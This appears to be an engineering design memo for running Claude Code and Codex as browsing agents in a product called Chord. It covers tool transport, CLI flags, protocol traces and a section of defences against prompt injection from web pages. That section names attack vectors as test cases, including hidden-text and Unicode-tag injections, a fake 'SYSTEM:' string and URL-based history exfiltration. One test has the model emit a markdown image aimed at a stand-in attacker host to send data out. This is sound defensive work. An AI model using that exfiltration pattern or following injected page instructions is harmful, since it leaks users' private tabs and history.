- ✅ **MCP 2026-07-28 changed Streamable HTTP.** It removed protocol-level sessions and the GET stream, and made `MCP-Protocol-Version`, `Mcp-Method` and `Mcp-Name` mandatory and checked against the body ([spec](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)). A Chord server would have to speak both eras to whatever the user's CLI ships.
- ✅ **The spec's own advice for local servers:** *"Use the `stdio` transport to limit access to just the MCP client"*, or IPC with restricted access ([security best practices](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices)). Inspector [CVE-2025-49596](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596) showed what an unauthenticated localhost MCP endpoint costs.
- ✅ **Claude times out HTTP MCP calls.** *"Each request also times out after 60 seconds by default"* unless a per-server `timeout` is set. Stdio has no per-request timer and a 30-minute idle window. Approval cards block inside the tool call, so this matters.
- ✅ **Inline `--mcp-config` JSON lands in argv**, which other local processes can read (T3 avoided this on purpose).

### 5.3 Recommended design
1. **One tool registry** in chord-agent. It enforces §11.3 tiers, scoping and approvals for every caller.
2. **Duet threads reach it through the `chord-mcp` stdio helper,** the same binary *Connect an agent* ships.
   - The helper connects over a named pipe (Windows) or a 0600 Unix socket.
   - Claude passes it as `{"mcpServers":{"chord":{"type":"stdio","command":"<path>","env":{"CHORD_MCP_TOKEN":"${CHORD_MCP_TOKEN}"}}}}`. The docs allow `${VAR}` expansion in `env` for `.mcp.json`; ⚠ for `--mcp-config` it's unverified (S9). Put that JSON in a 0600 temp file, or inline if it holds no secret.
   - The real token is set only in the `claude` process environment.
3. **One random 256-bit token per Duet thread.** chord-agent maps token → {thread, chord, attached tabs, grants}. Revoke it when the thread closes; mint a new one whenever the process restarts.
   - Without MCP sessions, the token is how the server knows which thread is calling. The spec allows `tools/list` to vary *"by the authorization presented"* ([tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).
4. ⚠ **Windows named pipes** default to granting Everyone read access ([Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)), and Node can't set a pipe's access list. So:
   - require the token in the first message;
   - write nothing before it's verified;
   - use a random pipe name.
5. **Codex:** `dynamicTools` or the same helper (S5, §3.3).
6. **Later optimisation:** Claude's in-process `sdk` MCP over the control channel. No helper process, scoped by construction, no idle timeout. It rests on the undocumented protocol; spike it before relying on it.
7. **Tool names:** snake_case, in chrome-devtools-mcp style where the two overlap, e.g. `list_tabs`, `read_tab`, `take_screenshot`, `search_history`, `search_archive`, `highlight_quote`, `open_tab`, `create_folder`, `move_tab`, `archive_tab`, `create_space`.
   - ✅ Claude API: `^[a-zA-Z0-9_-]{1,128}$` ([define tools](https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools)). The full `mcp__chord__…` name must be ≤128.
   - ✅ Codex rewrites anything outside `[A-Za-z0-9_]` to `_`.
8. **Annotations:** set `readOnlyHint` and `destructiveHint` accurately for external agents. Claude doesn't auto-approve on them; Codex `auto` mode does. Duet relies on Chord's own gate instead.
9. **Size limits:**
   - ✅ Claude warns above 10k tokens and caps MCP output at 25k tokens.
   - ✅ A text result over **50,000 characters** is *"saved to a file"*, and the model gets a path it can't open in browse mode.
   - Cap `read_tab` ranges at about 40k characters, or set `_meta["anthropic/maxResultSizeChars"]` (≤500k).
   - ⚠ Check Codex `tool_output_token_limit` in S5.

## 6. Prompt injection from web pages (for §11.4)

Grounding:
- ✅ [Anthropic: mitigate jailbreaks and prompt injections](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks): *"Put untrusted content only in tool results … never in `system` prompts or plain user `text` blocks"*; *"JSON-encode untrusted content"*; *"Don't put your own instructions in tool results."*
- ✅ [Anthropic research, 2025-11-24](https://www.anthropic.com/research/prompt-injection-defenses): still *"far from a solved problem"*.
- ✅ [Chrome's agentic security architecture, 2025-12-08](https://blog.google/security/architecting-security-for-agentic/): origin sets, a User Alignment Critic, confirmations.
- ✅ [Brave on Comet](https://brave.com/blog/comet-prompt-injection/) and [unseeable injections in screenshots](https://brave.com/blog/unseeable-prompt-injections/).
- ✅ [The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), Meta's [Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/), [design patterns](https://arxiv.org/abs/2506.08837), [CaMeL](https://arxiv.org/abs/2503.18813), [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/), [Spotlighting](https://arxiv.org/abs/2403.14720).

**Rules (each one testable):**
1. **Page text only arrives in tool results.** ✏️ The user message carries opaque handles and Chord-generated labels ("Attached: tab t7 · example.com"), never titles, page text or full URLs, all of which the page controls. *Test:* serializer unit test.
2. **Results are JSON-encoded with provenance:** `{"source":"web_page","tab_id","origin","url","retrieved_at","trust":"untrusted","range","content"}`, with no Chord instructions inside. *Test:* a page containing `"}`, `</page>` or a fake "SYSTEM:" stays inside the string.
3. **Rule of Two.** A browse thread already holds untrusted input and private data (tabs, history), so anything outbound or state-changing needs a person. *Test:* the tool × tier matrix allows zero unapproved outbound calls.
4. **URLs the model composed are tainted.** `open_tab` to a URL that didn't come from the user's own context always asks, and "Allow for this thread" never covers it (already in §11.4). ✏️ Also flag URLs whose path or query echo text from this thread's tool results.
5. ✏️ **The transcript can't make requests.**
   - No remote images, link unfurls or favicons in Duet messages.
   - Shell CSP `img-src 'self' data:`.
   - Links show the full URL and open only on click.
   - Markdown images are a known exfiltration channel ([example](https://simonwillison.net/2023/Apr/14/new-prompt-injection-attack-on-chatgpt-web-version-markdown-imag/)).
   - *Test:* the model outputs `![x](https://attacker/?d=…)` and zero requests go out.
6. **Scope is enforced by the server, per token.** A thread reads only attached or user-allowed tabs; widening scope takes a UI action, never model text. *Test:* a forged `tab_id` is denied.
7. **Approval cards are built from the real arguments.** Show the full decoded URL with the origin highlighted. Model-written "reasons" are shown quoted, as untrusted.
8. **Hidden-text stripping is hygiene, not a defence.** ✏️ Add to the §11.4 list: Unicode tag characters (U+E0000–E007F), zero-width and bidi controls, comments, `<template>`/`<noscript>`, and zero-size, off-screen or same-colour text; cap alt and title text. Caveat: `aria-hidden` sometimes hides visible text.
9. **Screenshots are untrusted input.** Faint text in images gets read. Same scoping as text.
10. **Explicit invocation and visible activity.** Already in §11.4.
11. **Optional classifier:** screen `read_tab` output with a small model (Anthropic's docs show this pattern) and surface flags to the user. One layer, not a guarantee.
12. **A red-team corpus in CI:** hidden-text pages, low-contrast screenshots, Unicode tags, markdown-image exfiltration, `open_tab` exfiltration of history, an attached tab telling the model to read a non-attached tab, fake approval reasons.

## 7. Protocol sketches (one turn each)

### 7.1 Claude Code (browse thread)

Spawn (no shell; cwd = `<userData>/duet/empty`):

```
claude -p --input-format stream-json --output-format stream-json --verbose
  --include-partial-messages
  --session-id 6f1c…  (or --resume 6f1c…)
  --model sonnet
  --restricted --tools "" --disable-slash-commands
  --strict-mcp-config --mcp-config <0600 temp file: chord stdio helper>
  --allowedTools "mcp__chord__*" --permission-prompts none
  --append-system-prompt-file <duet-browse.md> --system-prompt-snapshot off
env: CHORD_MCP_TOKEN=<per-thread> CLAUDE_CODE_DISABLE_CLAUDE_MDS=1 CLAUDE_CODE_DISABLE_AUTO_MEMORY=1
```

One turn. `→` is stdin and `←` is stdout. Field values are illustrative ⚠; the types are from the TS reference.

```
→ {"type":"user","message":{"role":"user","content":[{"type":"text","text":"Summarize this page.\n\nAttached: tab t7 · example.com"}]},"parent_tool_use_id":null}
← {"type":"system","subtype":"init","session_id":"6f1c…","cwd":"…\\duet\\empty","tools":["mcp__chord__list_tabs","mcp__chord__read_tab",…],"mcp_servers":[{"name":"chord","status":"connected"}],"model":"claude-sonnet-…","permissionMode":"default","claude_code_version":"2.1.308","capabilities":["interrupt_receipt_v1",…],…}
← {"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"I'll read the tab."}},"parent_tool_use_id":null,"session_id":"6f1c…","uuid":"…"}
← {"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"toolu_01","name":"mcp__chord__read_tab","input":{"tab_id":"t7","start":0,"length":40000}}],…},"parent_tool_use_id":null,"session_id":"6f1c…","uuid":"…"}
← {"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"toolu_01","content":[{"type":"text","text":"{\"source\":\"web_page\",\"tab_id\":\"t7\",\"origin\":\"https://example.com\",\"trust\":\"untrusted\",\"content\":\"…\"}"}]}]},"parent_tool_use_id":null,…}
← {"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"This page …"}},…}
← {"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"This page …"}],…},…}
← {"type":"result","subtype":"success","is_error":false,"num_turns":2,"result":"This page …","session_id":"6f1c…","permission_denials":[],"usage":{…},"total_cost_usd":…}
```

Stop (⚠ control protocol; send only if `capabilities` has `interrupt_receipt_v1`):

```
→ {"type":"control_request","request_id":"chord-1","request":{"subtype":"interrupt"}}
← {"type":"control_response","response":{"subtype":"success","request_id":"chord-1","response":{…}}}
```

### 7.2 Codex app-server (browse thread, `dynamicTools` variant)

From the generated schema. `→` is client to server; ids and `…` are illustrative ⚠.

```
→ {"id":0,"method":"initialize","params":{"clientInfo":{"name":"chord","title":"Chord","version":"0.2.0"},"capabilities":{"experimentalApi":true}}}
← {"id":0,"result":{"userAgent":"chord/…","codexHome":"…","platformFamily":"windows","platformOs":"windows"}}
→ {"method":"initialized"}
→ {"id":1,"method":"account/read","params":{"refreshToken":false}}
← {"id":1,"result":{"account":{"type":"chatgpt","planType":"plus",…},"requiresOpenaiAuth":true}}
→ {"id":2,"method":"thread/start","params":{"cwd":"…\\duet\\empty","sandbox":"read-only","approvalPolicy":"on-request","developerInstructions":"<duet-browse>","config":{"features.shell_tool":false,"features.unified_exec":false,"features.browser_use":false,"features.computer_use":false,"web_search":"disabled",…},"dynamicTools":[{"type":"namespace","name":"chord","description":"The user's browser tabs","tools":[{"type":"function","name":"read_tab","description":"Readable text of an attached tab","inputSchema":{"type":"object","properties":{"tab_id":{"type":"string"},"start":{"type":"integer"},"length":{"type":"integer"}},"required":["tab_id"],"additionalProperties":false}}]}]}}
← {"id":2,"result":{"thread":{"id":"thr_1",…},…}}
→ {"id":3,"method":"turn/start","params":{"threadId":"thr_1","input":[{"type":"text","text":"Summarize this page.\n\nAttached: tab t7 · example.com"}]}}
← {"id":3,"result":{"turn":{"id":"turn_1","status":"inProgress",…}}}
← {"method":"turn/started","params":{"threadId":"thr_1","turn":{"id":"turn_1",…}}}
← {"id":100,"method":"item/tool/call","params":{"threadId":"thr_1","turnId":"turn_1","callId":"call_1","namespace":"chord","tool":"read_tab","arguments":{"tab_id":"t7"}}}
→ {"id":100,"result":{"contentItems":[{"type":"inputText","text":"{\"source\":\"web_page\",…}"}],"success":true}}
← {"id":101,"method":"item/fileChange/requestApproval","params":{"threadId":"thr_1","turnId":"turn_1","itemId":"fc_1",…}}
→ {"id":101,"result":{"decision":"decline"}}
← {"method":"item/agentMessage/delta","params":{"threadId":"thr_1","turnId":"turn_1","itemId":"msg_1","delta":"This page "}}
← {"method":"item/completed","params":{"threadId":"thr_1","turnId":"turn_1","item":{"type":"agentMessage","id":"msg_1","text":"This page …",…}}}
← {"method":"turn/completed","params":{"threadId":"thr_1","turn":{"id":"turn_1","status":"completed",…}}}
```

- **Stop:** `{"id":4,"method":"turn/interrupt","params":{"threadId":"thr_1","turnId":"turn_1"}}`, after which `turn/completed` arrives with `status:"interrupted"`.
- ⚠ The `fileChange` lines show the tripwire path. S5 must confirm that read-only plus `on-request` really routes `apply_patch` to an approval request.

## 8. §11 checklist: confirmed / needs changing / unverified

| § | Claim | Status |
|---|---|---|
| 11.1 | Anthropic legal quotes (no Claude.ai login, no routing plan credentials, no intermediating; the unmodified-binary carve-out; Commercial Terms; enforcement "without prior notice") | ✅ verbatim, page undated |
| 11.1 | — | ✏️ Add the 2026-10-07 support note (third-party apps may use subscription limits) and the `--bare`-default risk |
| 11.1 | OpenAI: "No published policy for third-party clients" | ✏️ Now published: local/OSS app-server auth "can continue"; SIWC recommended; never for commercial or hosted use |
| 11.1 | Don't bundle; detect on PATH and in standard locations | ✅ Add the discovery table (§4.4) and PATH repair |
| 11.1 | Status from `claude auth status` (JSON; exit 0) | ✅ Use the exit code and `authMethod` only; show API-key billing |
| 11.1 | "Codex's equivalent" | ✏️ `codex login status` (exit 0/1) or `account/read`; never `getAuthStatus` |
| 11.1 | Spawn the native `claude`, not the SDK's `cli.js` | ✅ ✏️ Go further: ship no Agent SDK at all (proprietary; "SDK products should use API keys") |
| 11.1 | T3 Code drives the SDK and app-server | ✅ (SDK 0.3.276, user's binary) ⚠ plus a managed-Codex OAuth mode Chord shouldn't copy |
| 11.2 | One long-lived `claude` per thread; `-p` stream-json in and out, `--verbose`, `--include-partial-messages` | ✅ |
| 11.2 | `--session-id` / `--resume`, `--model <alias>` | ✅ |
| 11.2 | `--strict-mcp-config --mcp-config` inline JSON with HTTP URL and bearer token | ✏️ Flags ✅. Use the stdio helper, token in env, config in a 0600 file |
| 11.2 | `--permission-prompt-tool mcp__chord__approve` | ✅ exists ✏️ Browse mode uses `--allowedTools "mcp__chord__*" --permission-prompts none`; keep the prompt tool for developer mode |
| 11.2 | `--append-system-prompt-file` | ✅ (hidden from `--help`) ✏️ Add `--system-prompt-snapshot off` |
| 11.2 | `--restricted --tools ""` isolates browse threads | ✅ ✏️ Not complete: add CLAUDE.md and auto-memory env vars, `--disable-slash-commands`, an empty working directory; never `--bare` |
| 11.2 | Minimum CLI version; "run `claude update`" | ✅ ✏️ Copy depends on install method (package managers update themselves) |
| 11.2 | One `codex app-server` per agent process | ✅ for browse threads, with process-level `--disable` flags. Developer mode gets its own process later |
| 11.2 | Tools via MCP config overrides or `dynamicTools` (experimental) | ✅ both exist; S5 picks |
| 11.2 | "⚠ how to remove Codex's shell tool" | ✏️ Resolved: `--disable shell_tool`/`unified_exec`. `apply_patch` stays; it's a denylist; add the tripwire |
| 11.2 | Read-only sandbox, every command to Chord's approval UI | ✏️ Read-only ✅, but browse threads auto-decline and never show command/file approvals |
| 11.2 | Chord MCP: Streamable HTTP on 127.0.0.1, per-process bearer token, Host/Origin checks | ✏️ Replace with the stdio helper and per-thread tokens (§5.2). If HTTP is kept: MCP 2026-07-28 headers, per-server `timeout` > 60 s, per-thread tokens |
| 11.3 | Tool names `tabs.list`, `tab.read`, … | ✏️ snake_case (API regex, Codex rewriting, dynamicTools regex) |
| 11.3 | Tier 0 needs no approval; tier 1 gets a card per call | ✅ Enforced in Chord's registry; CLIs pre-allow Chord's tools |
| 11.3 | Developer mode routes the provider's own prompts to Chord's UI | ✅ Possible (Claude control-protocol `can_use_tool` or the prompt tool; Codex approval requests). Phase 4 |
| 11.4 | Extraction capped at 100k characters, ranged reads | ✏️ Ranges ≤ about 40k (Claude's 50k file-save) |
| 11.4 | Provenance wrapping; system prompt says page content is data | ✅ ✏️ Also JSON-encode, and never inline page content in the user turn (fix the §11.2 diagram) |
| 11.4 | Browse threads: no shell, no files, no fetch | ✅ Claude. ⚠ Codex: no shell or search, but `apply_patch` is present and blocked by sandbox and decline |
| 11.4 | `tab.open` URL-exfiltration rule | ✅ ✏️ Add the transcript-rendering rule (no remote images or unfurls) |
| 11.4 | Skip hidden and `aria-hidden` subtrees | ✅ hygiene ✏️ Add Unicode tag, zero-width and bidi stripping; note the `aria-hidden` caveat |
| 11.4 | `chord-mcp` stdio helper over a named pipe / 0600 socket | ✅ matches the MCP spec's advice ⚠ Windows pipe default access list (§5.3) |
| 11.4 | Provider transcripts under `~/.claude/projects`, `~/.codex/sessions` | ✅ ✏️ Also large tool results under `~/.claude/projects/…/tool-results`; Codex threads show in the user's Codex history |
| 4 | chord-agent killed after 10 min idle | ✅ ✏️ Kill provider process trees (Codex starts a Code Mode host) |
| 8 | `duet.port` / `duet.approve` / `duet.attach` | ✅ unaffected |

## 9. Proposed edits to ARCHITECTURE.md
1. **§11.1:**
   - Add the 2026-10-07 support quote and the OpenAI app-server auth quote; replace "No published policy … was found".
   - Add "ship no Agent SDK".
   - Name `codex login status` / `account/read` and ban `getAuthStatus`.
   - Add "show API-key billing when `authMethod` is `api_key`".
2. **§11.2 Claude adapter:**
   - Replace the command block with §7.1.
   - Note interrupt: the control-protocol `interrupt` when advertised, otherwise kill and `--resume`; SIGINT is not available on Windows.
3. **§11.2 Codex adapter:**
   - Replace the S5 ⚠ bullets with the §3.3 recipe, the tripwire and the open S5 questions.
   - Optionally drive sign-in through `account/login/start` (the app-server opens the auth URL; tokens stay in Codex).
4. **§11.2 Chord MCP server and the §4 diagram:**
   - Drop the 127.0.0.1 HTTP server for Duet. Duet uses the `chord-mcp` stdio helper with per-thread tokens.
   - Change the `CC -- HTTP --> MCP` edges to `stdio helper → pipe`.
5. **§11.2 sequence diagram:** `turn {thread, text, resolved context}` becomes `turn {thread, text, attachment handles}`. Content flows only through `read_tab`.
6. **§11.3:** rename tools to snake_case; note that Chord, not the CLIs, enforces tiers.
7. **§11.4:** add rules 1, 2, 5, 8, 9, 11 and 12 from §6; set ranged reads to ≤40k characters; extend the storage disclosure.
8. **§17:**
   - R8 adds "`--bare` becomes the `-p` default" and "OpenAI narrows app-server auth".
   - New risks: "provider CLI churn (Claude ships 1–2 releases a day; app-server is experimental)" and "Codex denylist drift".
9. **§17 spikes:** expand S5 per §3.3, and add **S9** (Claude headless contract on Windows: the stream-json loop, interrupt, the stdio helper with an env token, `--restricted` isolation, the 50k result path).

## 10. Risks
| Risk | Likelihood / impact | Mitigation |
|---|---|---|
| `--bare` becomes the `-p` default and ignores OAuth | Medium / severe for Claude | Watch the changelog in a daily canary. Detect auth failure at `system/init` / `api_retry`. Look for an opt-out flag when it lands. Codex and BYO key remain as backstops |
| Anthropic enforces against third-party subscription use | Low–medium / severe | Unmodified binary, no tokens, no SDK, plain-text naming. R8 backstops |
| OpenAI narrows app-server auth to SIWC-only | Medium / high for Codex | Keep `account/read` as the only auth touchpoint. Decide on SIWC only if forced (it conflicts with no-credentials) |
| Undocumented or experimental surfaces change (Claude control protocol, Codex `dynamicTools`, app-server itself) | High / medium | Feature-detect (`capabilities`, generated types). Documented fallbacks (kill+resume, the MCP helper). A daily CI canary against `latest` |
| Codex adds a default-on tool that leaks into browse threads | Medium / high | Process-level `--disable` list, the tripwire, a tested-version table, warn on untested versions |
| `apply_patch` writes despite the read-only sandbox | Low / high | S5 test on all three OSes. The working directory is an empty folder |
| Windows spawn and PATH failures | High / medium | Real `.exe`, `shell:false`, PATH repair, a user path override, Setup shows the resolved path |
| Approval waits hit tool timeouts | Medium / medium | stdio (no per-request timer) or dynamicTools. Raise Codex `tool_timeout_sec` |
| Prompt injection (R10) | High / high | §6 rules, red-team corpus in CI |
| Provider transcripts and tool results persist in the user's home | Certain / low | Disclose in Settings. Offer `ephemeral` / `--no-session-persistence` later (costs resume) |
| Flatpak sandbox can't spawn host CLIs | Medium / medium (Phase 3) | `flatpak-spawn --host` with Flathub justification, or Duet off in the Flatpak build ⚠ |

## 11. Recommended Phase 2 build order
1. **Spikes, about 2 days:**
   - **S5:** the Codex browse recipe, tripwire, dynamicTools vs. helper, approval-wait timeouts, resume.
   - **S9:** the Claude headless contract on Windows and Linux.
   - Write both up in `docs/decisions/`.
2. **Tool registry in chord-agent:**
   - snake_case tools; tiers, scopes and grants per token; the approval state machine.
   - Isolated-world extraction with JSON-encoded, provenance-tagged, ranged results.
   - Pure, unit-tested, with the red-team fixtures.
3. **`chord-mcp` stdio helper** (Node SEA) plus the pipe/socket server and per-thread tokens. This is shared with *Connect an agent*, so build it once.
4. **Provider discovery and Setup UI:**
   - Binary resolution and PATH repair, `--version` parsing, the minimum/tested version table.
   - `claude auth status` / `codex login status`.
   - Sign-in via a terminal (Claude) or `account/login/start` (Codex).
5. **Claude adapter:** spawn, the stream-json parser (zod schemas written from the TS reference), streaming deltas over `duet.port`, interrupt, crash then resume, error mapping from `api_retry` / `result` to DESIGN §7.8 *Provider error*.
6. **DuetPanel:** streaming text, `ToolActivityRow`, `ApprovalCard`, citations with `highlight_quote`, context chips, a transcript CSP with no remote loads.
7. **Codex adapter:** the S5 recipe, generated types pinned per tested version, tripwire, `turn/interrupt`, `account/read`.
8. **Hardening:** exclusions, per-chord and global off, idle kill of process trees, a daily canary CI job against the `latest` CLIs, settings disclosure for provider transcripts.

**Minimum versions to propose** (S9 and S5 confirm):
- Claude Code **≥ 2.1.268**: `--restricted` 2.1.248, `--system-prompt-snapshot` 2.1.257, `--permission-prompts` 2.1.259, `pending_permission_requests` on initialize 2.1.268.
- Codex **≥ 0.160** ⚠, to be set by S5.
- Warn, don't block, above the tested version.

## 12. Open questions for you
1. **Codex sign-in path.** Stay with the user's own `codex login` / app-server sign-in (no credentials in Chord; OpenAI says local and open-source apps "can continue")? Or adopt Sign in with ChatGPT, which OpenAI recommends but which means Chord stores OAuth tokens? *Default: stay.*
2. **Anthropic.** Proceed under D2 as is? Or send a courtesy note to Anthropic, given the "running Claude Code in your products requires Commercial Terms" paragraph? *Default: proceed; the 2026-10-07 note is the strongest signal yet.*
3. **Claude adapter surface.** Raw CLI with no Anthropic code shipped (recommended)? Or the Agent SDK like T3 Code (a documented API, but proprietary redistribution and the "SDK products should use API keys" line)?
4. **Stop on Windows.** Accept the typed-but-undocumented control-protocol `interrupt`, or accept kill-and-resume?
5. **Drop the localhost HTTP MCP server.** Duet would use only the stdio helper. This changes the §4 diagram.
6. **WSL-only CLI installs.** Phase 2, or later? *Default: later.*
